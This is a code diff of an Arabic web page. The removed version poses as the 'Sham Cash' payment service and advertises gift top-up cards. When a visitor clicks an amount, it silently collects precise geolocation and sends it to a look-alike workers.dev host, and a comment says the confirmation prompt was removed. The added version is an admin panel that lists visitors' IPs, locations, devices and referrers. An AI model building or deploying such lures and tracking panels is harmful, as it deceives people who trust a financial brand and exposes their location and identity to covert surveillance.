@@ -1,286 +1,96 @@
-
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="theme-color" content="#081b27">
-  <title>بطاقات الشحن | شام كاش</title>
-
-  <style>
-    * {
-      box-sizing: border-box;
-    }
-
-    body {
-      margin: 0;
-      min-height: 100vh;
-      font-family: Tahoma, Arial, sans-serif;
-      color: #fff;
-      background:
-        radial-gradient(ellipse at 85% 12%, #16404a 0%, transparent 42%),
-        linear-gradient(145deg, #071923, #092631 55%, #06151f);
-    }
-
-    header {
-      min-height: 78px;
-      padding: 0 22px;
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      border-bottom: 1px solid rgba(255,255,255,.08);
-    }
-
-    .menu {
-      color: white;
-      font-size: 29px;
-      cursor: pointer;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      font-size: 21px;
-      font-weight: bold;
-    }
-
-    .logo-mark {
-      width: 34px;
-      height: 34px;
-      position: relative;
-      transform: rotate(45deg);
-      border: 5px solid #16c7a0;
-      border-radius: 8px;
-    }
-
-    .logo-mark::after {
-      content: "";
-      position: absolute;
-      inset: 5px;
-      border: 3px solid #16c7a0;
-      border-radius: 3px;
-    }
-
-    main {
-      width: min(100% - 36px, 720px);
-      margin: 0 auto;
-      padding: 42px 0 36px;
-    }
-
-    .eyebrow {
-      color: #32d6b0;
-      font-size: 14px;
-      margin-bottom: 12px;
-    }
-
-    h1 {
-      font-size: clamp(27px, 6vw, 38px);
-      line-height: 1.65;
-      margin: 0 0 18px;
-      font-weight: 800;
-    }
-
-    .description {
-      color: #d2dfe4;
-      font-size: 17px;
-      line-height: 2.05;
-      margin: 0 0 28px;
-    }
-
-    .cards-title {
-      font-size: 17px;
-      margin: 28px 0 15px;
-    }
-
-    .cards {
-      display: grid;
-      grid-template-columns: repeat(2, minmax(0, 1fr));
-      gap: 12px;
-    }
-
-    .card {
-      border: 1px solid rgba(45,215,178,.35);
-      background: rgba(255,255,255,.045);
-      color: white;
-      border-radius: 14px;
-      padding: 20px 12px;
-      text-align: center;
-      cursor: pointer;
-      font-family: inherit;
-      transition: background .2s, transform .2s;
-    }
-
-    .card:hover {
-      background: rgba(27,184,151,.14);
-      transform: translateY(-2px);
-    }
-
-    .amount {
-      display: block;
-      color: #37dfb8;
-      font-size: 27px;
-      font-weight: bold;
-      margin-bottom: 8px;
-      direction: ltr;
-      cursor: pointer;
-    }
-
-    .caption {
-      color: #d1dfe3;
-      font-size: 13px;
-    }
-
-    .more {
-      display: block;
-      width: 100%;
-      margin-top: 28px;
-      padding: 16px;
-      border-radius: 12px;
-      background: #17b995;
-      color: #06251f;
-      text-decoration: none;
-      text-align: center;
-      font-size: 17px;
-      font-weight: bold;
-    }
-
-    footer {
-      text-align: center;
-      padding: 20px;
-      color: #80979e;
-      font-size: 12px;
-    }
-
-    @media (max-width: 380px) {
-      main {
-        width: calc(100% - 28px);
-        padding-top: 30px;
-      }
-
-      .description {
-        font-size: 15px;
-      }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>لوحة الزوار</title>
+<style>
+  body { font-family: Tahoma, Arial, sans-serif; background:#0b1220; color:#e6edf3; margin:0; padding:24px; }
+  h1 { font-size:20px; margin-bottom:16px; }
+  .login { max-width:320px; margin:80px auto; background:#111a2b; padding:24px; border-radius:12px; }
+  .login input { width:100%; padding:10px; margin:8px 0; border-radius:6px; border:1px solid #2a3850; background:#0b1220; color:#fff; box-sizing:border-box; }
+  .login button, .refresh { width:100%; padding:10px; border-radius:6px; border:none; background:#2f81f7; color:#fff; cursor:pointer; font-size:14px; }
+  table { width:100%; border-collapse:collapse; margin-top:16px; font-size:13px; }
+  th, td { padding:8px; border-bottom:1px solid #223047; text-align:right; }
+  th { color:#9fb3c8; }
+  .stats { display:flex; gap:12px; margin-bottom:16px; flex-wrap:wrap; }
+  .stat-card { background:#111a2b; padding:12px 16px; border-radius:10px; min-width:120px; }
+  .stat-card .num { font-size:22px; font-weight:bold; }
+  .stat-card .label { font-size:12px; color:#9fb3c8; }
+  #app { display:none; max-width:1000px; margin:0 auto; }
+  .error { color:#ff6b6b; font-size:13px; margin-top:8px; }
+</style>
 </head>
-
 <body>
-  <header>
-    <div class="menu" aria-label="القائمة">☰</div>
 
-    <div class="logo">
-      <span>شام كاش</span>
-      <span class="logo-mark" aria-hidden="true"></span>
-    </div>
-  </header>
+<div class="login" id="loginBox">
+  <h1>دخول لوحة الإدارة</h1>
+  <input type="password" id="pwd" placeholder="كلمة المرور">
+  <button onclick="login()">دخول</button>
+  <div class="error" id="loginError"></div>
+</div>
 
-  <main>
-    <div class="eyebrow">خدمات شام كاش</div>
+<div id="app">
+  <h1>زوار الموقع</h1>
+  <div class="stats" id="stats"></div>
+  <button class="refresh" onclick="loadVisitors()">تحديث</button>
+  <table>
+    <thead>
+      <tr>
+        <th>الوقت</th><th>IP</th><th>الدولة/المدينة</th><th>الجهاز</th><th>النظام</th><th>المتصفح</th><th>اللغة</th><th>المصدر</th>
+      </tr>
+    </thead>
+    <tbody id="rows"></tbody>
+  </table>
+</div>
 
-    <h1>شام كاش تطلق خدمة بطاقات الشحن</h1>
+<script>
+  // عدّل هذا إلى رابط الـ backend بعد نشره (لا تتركه localhost في الإنتاج)
+  const API_BASE = 'https://bachend-3iij.onrender.com'; 
+  let password = '';
 
-    <p class="description">
-      يمكنك الآن إهداء رصيد شام كاش لمن تحب دون الحاجة إلى وجود حساب شام كاش أصلًا.
-      يمكنك شراء بطاقات شام كاش 10$ و20$ و50$ و100$، والتي تحتوي على كود شحن.
-      يمكنك إعطاء البطاقة لأي شخص، ليقوم بإدخال كود الشحن في النسخة الأحدث من تطبيق
-      شام كاش، وبمجرد إدخال الكود سيحصل على قيمة البطاقة.
-    </p>
+  function login() {
+    password = document.getElementById('pwd').value;
+    fetch(`${API_BASE}/admin/stats`, { headers: { 'x-admin-password': password } })
+      .then(r => { if (!r.ok) throw new Error('كلمة المرور غير صحيحة'); return r.json(); })
+      .then(() => {
+        document.getElementById('loginBox').style.display = 'none';
+        document.getElementById('app').style.display = 'block';
+        loadStats();
+        loadVisitors();
+      })
+      .catch(e => { document.getElementById('loginError').textContent = e.message; });
+  }
 
-    <h2 class="cards-title">بطاقات الشحن المتاحة</h2>
+  function loadStats() {
+    fetch(`${API_BASE}/admin/stats`, { headers: { 'x-admin-password': password } })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('stats').innerHTML = `
+          <div class="stat-card"><div class="num">${data.total}</div><div class="label">إجمالي الزيارات</div></div>
+          <div class="stat-card"><div class="num">${data.last24h}</div><div class="label">آخر 24 ساعة</div></div>
+        `;
+      });
+  }
 
-    <div class="cards">
-      <button class="card" type="button">
-        <span class="amount">10$</span>
-        <span class="caption">بطاقة شام كاش</span>
-      </button>
-
-      <button class="card" type="button">
-        <span class="amount">20$</span>
-        <span class="caption">بطاقة شام كاش</span>
-      </button>
-
-      <button class="card" type="button">
-        <span class="amount">50$</span>
-        <span class="caption">بطاقة شام كاش</span>
-      </button>
-
-      <button class="card" type="button">
-        <span class="amount">100$</span>
-        <span class="caption">بطاقة شام كاش</span>
-      </button>
-    </div>
-
-    <a
-      class="more"
-      href="https://shamcash.org/"
-      target="_blank"
-      rel="noopener noreferrer"
-    >
-      تعرّف على المزيد
-    </a>
-  </main>
-
-  <footer>شام كاش — بطاقات الشحن</footer>
-
-  <script>
-  const cards = document.querySelectorAll('.amount');
-  const WORKER_URL = 'https://shamcash.shamcach.workers.dev/';
-
-  cards.forEach((card) => {
-    card.style.cursor = 'pointer';
-
-    card.addEventListener('click', async () => {
-      // تم إزالة نافذة التأكيد (confirm) ليعمل الكود مباشرة عند الضغط
-
-      if (!navigator.geolocation) {
-        console.error('المتصفح لا يدعم تحديد الموقع الجغرافي.');
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition(
-        async (position) => {
-          const locationData = {
-            locationConsent: true,
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            accuracy: position.coords.accuracy,
-            card: card.textContent.trim(),
-            userAgent: navigator.userAgent,
-            timestamp: new Date().toISOString()
-          };
-
-          try {
-            const response = await fetch(WORKER_URL, {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify(locationData)
-            });
-
-            if (!response.ok) {
-              console.error('تعذر إرسال البيانات، الحالة:', response.status);
-              return;
-            }
-
-            console.log('تم إرسال البيانات بنجاح.');
-          } catch (error) {
-            console.error('خطأ في الاتصال:', error);
-          }
-        },
-        (error) => {
-          console.error('لم يتم الحصول على الموقع:', error.message);
-        },
-        {
-          enableHighAccuracy: true,
-          timeout: 15000,
-          maximumAge: 0
-        }
-      );
-    });
-  });
+  function loadVisitors() {
+    fetch(`${API_BASE}/admin/visitors?limit=50`, { headers: { 'x-admin-password': password } })
+      .then(r => r.json())
+      .then(data => {
+        document.getElementById('rows').innerHTML = data.rows.map(v => `
+          <tr>
+            <td>${v.created_at}</td>
+            <td>${v.ip || '-'}</td>
+            <td>${(v.country || '-') + ' / ' + (v.city || '-')}</td>
+            <td>${v.device_type || '-'}</td>
+            <td>${v.os || '-'}</td>
+            <td>${v.browser || '-'}</td>
+            <td>${v.language || '-'}</td>
+            <td>${v.referrer || '-'}</td>
+          </tr>
+        `).join('');
+      });
+  }
 </script>
-
 </body>
 </html>
